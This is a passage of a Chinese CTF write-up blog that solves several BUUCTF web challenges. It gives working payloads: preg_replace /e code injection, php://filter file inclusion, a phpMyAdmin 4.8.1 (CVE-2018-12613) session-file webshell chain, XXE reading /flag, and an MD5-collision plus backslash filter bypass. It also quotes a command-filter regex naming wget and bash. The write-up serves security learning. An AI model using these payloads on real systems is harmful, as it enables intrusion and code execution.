使用了<code>/e</code>标签,意思是将完成替换后的字符串当作php代码来执行</strong></p><p><code>strtolower(&quot;\\1&quot;)</code>得到得结果也就是<code>\\1</code>, 其中第一个反斜杠将第二个反斜杠转义,所以最后也就是<code>\1</code>, 这里<code>\1</code>具有特殊含义,<strong>也就是指定第一个匹配项:</strong></p><blockquote><p>反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中， 所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。 缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 <code>\n</code> 访问， 其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p>在<code>foreach</code>中,<code>$_GET</code>是一个数组, <code>$re</code>和<code>$str</code>分别是数组中的键和值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span>=<span class="keyword">array</span>(<span class="string">&#x27;one&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;two&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;--&#x27;</span>.<span class="variable">$val</span>;</span><br><span class="line"><span class="comment">#one--1</span></span><br><span class="line"><span class="comment">#two--2</span></span><br></pre></td></tr></table></figure><p>所以综合起来看,我们如果在GET中传一个变量</p><p><strong>这个变量传到<code>complex</code>函数的<code>preg_replace</code>的变量名将作为匹配模式,也就是第一个参数, 变量值将作为匹配字符串,也就是第三个参数, 第一个匹配结果将被作为代码来执行</strong></p><p>那么这里就需要给<code>$str</code>传一个能够被执行的函数, 并且给<code>$re</code>传一个能够把整个函数名匹配到的正则表达式</p><p>那么传一下试试: 这里<code>\S</code>表示匹配任意非空白字符, <code>*</code>表示零至多次. 这里<code>phpinfo</code>外面加上括号和<code>$</code>是为了把<code>phpinfo()</code>本身当作变量来执行,否则只会把<code>phpinfo()</code>当作普通的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019232635204-1667047819735106.png" alt="image-20221019232635204" style="zoom:67%;" /><p>直接写<code>phpinfo()</code>时: 这里 <code>preg_replace</code>仅仅按照<code>\1</code>的要求返回了第一项的匹配结果, 并通过<code>foreach</code>中的echo</p><img src="/images/buuctf-web/image-20221019232607351-1667047819735107.png" alt="image-20221019232607351" style="zoom:67%;" /><p>那么接下来就可以执行命令获取<code>flag</code>了, 可以借助代码中给的<code>getFlag</code>函数 (这里最后面输出的命令是<code>foreach</code>那里输出的)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019233132811.png" alt="image-20221019233132811" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=$&#123;getFlag()&#125;&amp;cmd=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221019233442119.png" alt="image-20221019233442119" style="zoom:67%;" /><br><hr><br><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><img src="/images/buuctf-web/image-20221019235152219-1667047819735108.png" alt="image-20221019235152219" style="zoom:50%;" /><p>这里分别点击两个连接,会通过GET来传参</p><img src="/images/buuctf-web/image-20221019235244100-1667047819735109.png" alt="image-20221019235244100" style="zoom:67%;" /><p>尝试修改一下参数的值:</p><img src="/images/buuctf-web/image-20221019235321272-1667047819735110.png" alt="image-20221019235321272" style="zoom: 67%;" /><p>当参数值中仍然包含<code>woofers</code>或者<code>meowers</code>但是后面加上其他字符时: 出现了报错:</p><img src="/images/buuctf-web/image-20221019235442137-1667047819735111.png" alt="image-20221019235442137" style="zoom: 80%;" /><p>那么可以发现这里的逻辑实际上是先使用<code>strpos</code>函数来检测传的参数值中是否包括了<code>woofers</code>或者<code>meowers</code>,如果不包括则返回上上个页面,如果包括了,则在参数值后面加上<code>.php</code>然后去<code>include</code>包含这个<code>xxx.php</code>的文件. 这里由于传的是<code>wooferssss</code>,而包含的时候又找不到<code>wooferssss.php</code>自然就报错了</p><p>那么知道了是文件包含,使用伪协议就好了,先输出一下<code>index.php</code>的源码: 注意这里会在结尾自动加<code>.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://277e962e-4d21-4394-b91b-5aca2d6aba9e.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p>将输出的<code>base64</code>编码解码后得到: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要想实现包含, 参数里必须包含<code>woofers</code>或者<code>meowers</code>或者<code>index</code></p><p><strong>这里有个小技巧,<code>php</code>伪协议中,在任意位置套一层其他协议,虽然可能会产生报错,但是不影响输出,(无法找到对应的过滤器时就会跳过它)例如:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/meowers/read=convert.base64-encode/resource=flag</span><br><span class="line">?category=php://filter/read=convert.base64-encode/meowers/resource=flag</span><br><span class="line">//这里并不存在的&#x27;meowers&#x27;可以放在任意位置</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020001536369.png" alt="image-20221020001536369" style="zoom:80%;" /><p>解码出来就得到flag了.</p><br><hr><br><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>发现存在<code>robots.txt</code>,不过看了下<code>phpinfo.php</code>,也没啥提示</p><img src="/images/buuctf-web/image-20221020090457446.png" alt="image-20221020090457446" style="zoom:67%;" /><p><code>dirsearch</code>扫到了<code>phpmyadmin</code>目录:</p><img src="/images/buuctf-web/image-20221020091257148.png" alt="image-20221020091257148" style="zoom:67%;" /><p>这里发现<code>phpmyadmin</code>的版本只有4.8.1</p><img src="/images/buuctf-web/image-20221020092057719.png" alt="image-20221020092057719" style="zoom:80%;" /><p>这里总结了<code>phpmyadmin</code>各个版本的漏洞:<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0</a></p><p>其中4.8.1可利用的有<code>CVE-2018-12613：后台文件包含</code></p><p>SQL执行,将PHP代码写入<code>Session</code>文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_GET[&#x27;a&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020094425642.png" alt="image-20221020094425642" style="zoom:80%;" /><p>接下来包含这个<code>Session</code>文件: 这里的<code>835v7i8inaavcmf1so2dg88flm</code>是<code>phpmyadmin</code>的<code>cookie</code>值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&amp;a=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020094618243-1667047819735112.png" alt="image-20221020094618243" style="zoom:67%;" /><p>然后就可以上传的一句话木马执行任意命令了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&amp;a=system(&quot;ls /&quot;);</span><br><span class="line">http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&amp;a=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020094219846-1667047819735113.png" alt="image-20221020094219846" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221020094320734-1667047819735114.png" alt="image-20221020094320734" style="zoom:67%;" /><br><hr><br><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><img src="/images/buuctf-web/image-20221020102354830-1667047819735115.png" alt="image-20221020102354830" style="zoom: 50%;" /><img src="/images/buuctf-web/image-20221020102429804-1667047819735116.png" alt="image-20221020102429804" style="zoom:67%;" /><p><code>dirsearch</code>扫描,发现<code>.git</code>泄露:</p><img src="/images/buuctf-web/image-20221020102729256.png" alt="image-20221020102729256" style="zoom:67%;" /><p>使用<code>githack</code>工具进行利用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GitHack.py http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/.git/</span><br></pre></td></tr></table></figure><p>能够扫到<code>flag.php</code>和<code>index.php</code>,但是有概率扒不下来,执行一下<code>git init</code>,再多尝试几次就好了:</p><img src="/images/buuctf-web/image-20221020104605588.png" alt="image-20221020104605588" style="zoom:80%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>这里是变量覆盖: 思路就是直接<strong>用get传参数把$flag的值放到其他变量中，输出对应的变量</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如果选择在第23行的exit处输出flag: </span><br><span class="line">需要把$yds覆盖成$flag, 且GET和POST中都不传flag</span><br><span class="line">http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/index.php?yds=flag</span><br><span class="line">这样不传POST就行了</span><br><span class="line"></span><br><span class="line">如果选择在第26行的exit处输出flag:</span><br><span class="line">需要将$is覆盖成$flag, 且有$_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;或者$_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;</span><br><span class="line">这里如果传$_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;会导致flag变量被覆盖,所以依然在get中传这个参数:</span><br><span class="line">http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/index.php?is=flag&amp;flag=flag</span><br><span class="line"></span><br><span class="line">如果在最后输出flag,想了半天没想出来..</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><img src="/images/buuctf-web/image-20221020114653824-1667047819735117.png" alt="image-20221020114653824" style="zoom:67%;" /><p>看源码,用户提交的数据被拼接成了<code>XML</code>数据,这里可能会考<code>xxe</code></p><p>抓包发现<code>username</code>中的内容能够回显</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;asdf&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>这里自定义变量<code>&amp;xxe</code>的值就是<code>SYSTEM &quot;file:///flag&quot;</code> </p><p>通过响应页面对<code>username</code>标签的回显,将这段代码的执行结果,也就是读取<code>/flag</code>的内容输出</p><img src="/images/buuctf-web/image-20221020120500948-1667047819735118.png" alt="image-20221020120500948" style="zoom:67%;" /><br><hr><br><h1 id="md5强比较绕过-easy-web"><a href="#md5强比较绕过-easy-web" class="headerlink" title="[md5强比较绕过]easy_web"></a>[md5强比较绕过]easy_web</h1><p>进来看到<code>url</code>中有两个参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure><p>源码里有提示: <code>md5</code>相关</p><p><img src="/images/buuctf-web/image-20221020145903227.png" alt="image-20221020145903227" style="zoom:67%;" />..</p><img src="/images/buuctf-web/image-20221020153441156-1667047819735119.png" alt="image-20221020153441156" style="zoom: 80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php:</span><br><span class="line">7068703a2f2f66696c7465722f726561643d636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870</span><br><span class="line">index.php:</span><br><span class="line">696e6465782e706870</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020154152153-1667047819735120.png" alt="image-20221020154152153" style="zoom:67%;" /><p>解密得到<code>index.php</code>的源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]))); <span class="comment">//对file进行两次base64解码,然后从16进制转为2进制</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123; <span class="comment">//file中不能包含&quot;flag&quot;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));  <span class="comment">//读取的file内容进行base64编码</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="comment">// cmd中的过滤字符</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>27行中,php中<strong>用反引号包裹的变量</strong>, <strong>会将变量值当作<code>shell</code>命令来执行</strong>,并返回执行结果</p><p>所以这里就是让<code>cmd</code>避开过滤字符执行系统命令</p><p>同时还要POST两个变量a和b,它们转字符串之后的值不相等,但md5值相等</p><p>这里由于使用了<code>===</code>强相等, 所以之前使用的数组绕过,<code>0e</code>绕过等就无法使用了</p><p>这里利用md5碰撞工具<code>fastcoll</code>,产生两个md5值相同的2进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\md5碰撞\fastcoll_v1.0.0.5.exe&gt;fastcoll_v1.0.0.5.exe -o a b</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: &#x27;a&#x27; and &#x27;b&#x27;</span><br><span class="line">Using initial value: 0123456789abcdeffedcba9876543210</span><br><span class="line"></span><br><span class="line">Generating first block: .</span><br><span class="line">Generating second block: S11.</span><br><span class="line">Running time: 0.153 s</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020163346764-1667047819735121.png" alt="image-20221020163346764" style="zoom:67%;" /><p>在<code>burpsuite</code>的<code>repeater</code>中右键:<code>paste from file</code>,加载文件后选中右键-<code>send to decoder</code>(注意,直接复制到<code>decoder</code>中的话不是对二进制进行编码,结果会不一样), 然后进行URL编码:</p><img src="/images/buuctf-web/image-20221020163559394-1667047819735122.png" alt="image-20221020163559394" style="zoom:67%;" /><p>将编码后的内容分别复制给a和b</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%6c%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%4d%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%4d%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%4e%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%0b%df%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%ce%5f%ea%a5%e3&amp;b=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%ec%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%cd%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%cd%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%ce%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%8b%de%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%4e%5f%ea%a5%e3</span><br></pre></td></tr></table></figure><p>运行一下,响应包中没有<code>forbid ~</code>, 说明成功绕过了<code>md5</code>强比较</p><img src="/images/buuctf-web/image-20221020163652761-1667047819735123.png" alt="image-20221020163652761" style="zoom:80%;" /><p>下一步该考虑怎样绕过过滤字符来执行命令了</p><p>知识点: php中<code>preg_match</code>这里对反斜杠的过滤是有问题的</p><p>对反引号的检测无效，而在Linux中，反引号对一些命令也几乎没有影响</p><p>所以在常规命令里加一个反斜杠,一方面反斜杠无法被过滤,另一方面也导致命令也不会被过滤了:</p><img src="/images/buuctf-web/image-20221020164005294-1667047819735124.png" alt="image-20221020164005294" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=l\s+/   相当于执行了ls /   这里`+`是url中的连接符</span><br><span class="line">cmd=ca\t+/flag  </span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020164200800-1667047819735125.png" alt="image-20221020164200800" style="zoom:67%;" /><br><hr><br><h1 id="脚本爆破-高明的黑客"><a href="#脚本爆破-高明的黑客" class="headerlink" title="[脚本爆破]高明的黑客"></a>[脚本爆破]高明的黑客</h1><h2 id="写脚本遍历"><a href="#写脚本遍历" class="headerlink" title="写脚本遍历"></a>写脚本遍历</h2><img src="/images/buuctf-web/image-20221020171427555-1667047819735126.png" 